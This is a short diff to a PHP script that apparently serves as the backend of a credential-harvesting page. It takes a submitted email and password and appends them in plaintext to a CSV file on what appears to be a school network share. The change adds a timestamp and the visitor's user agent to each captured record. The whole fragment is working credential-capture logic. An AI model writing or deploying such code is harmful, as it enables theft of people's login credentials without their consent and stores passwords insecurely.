@@ -18,11 +18,16 @@ if (isset($_POST['pass']) && empty($_POST['pass'])) {
 
 
 //name of file where data would be stored in
-
-$filename = "../../data.csv";
+//$filename = "../../data.csv";
+$filename = "N:\COMMUN\ELEVE\INFO\SI-T1a\PO\data.csv";
 
 //merging all variables into a sinle variable
-$data = sprintf("%s;%s\n", $email, $password);
+$format = "%s;%s;%s;%s\n";
+$user_agent = "UNDEFINED";
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+}
+$data = sprintf($format, $email, $password, date("d.m.Y H:i:s", time()), $user_agent);
 
 
 //save details to file
